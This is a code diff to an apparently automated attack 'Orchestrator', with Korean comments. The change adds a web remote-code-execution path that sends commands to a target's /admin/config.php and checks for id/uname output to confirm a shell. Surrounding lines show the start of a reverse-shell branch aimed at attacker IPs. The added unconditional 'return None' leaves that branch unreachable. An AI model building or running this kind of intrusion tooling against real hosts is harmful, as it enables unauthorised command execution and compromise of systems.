@@ -1439,7 +1439,15 @@ class Orchestrator:
 
         # (1) 웹 RCE 분기 (기존, 순서 2)
         if self.world.web_product and self.auto_poc:
-            ...  # 기존 그대로
+            # PoC 가 성립시킨 cmd 엔드포인트(없으면 기본 config.php) — ②에서 정교화
+            url = getattr(self, "rce_url", None) or f"https://{self.world.target}/admin/config.php"
+            ws = WebRceSession(url, "cmd", method="POST", inject="body")
+            ws.attach(web_http_fn)                       # ← 실제 HTTP (표면)
+            # ★ 성립 검증: id/uname 신호가 없으면 헛발판 → 폐기(거짓 '발판 확보' 방지)
+            if looks_like_shell(ws.run(verify_probe_command())):
+                return ws
+            return None
+        return None
 
         # (2) 역쉘 분기: 리스너를 백그라운드로 먼저 띄우고 → 페이로드 발사 → accept 대기
         attacker = list(self.guard.attacker_ips or [])
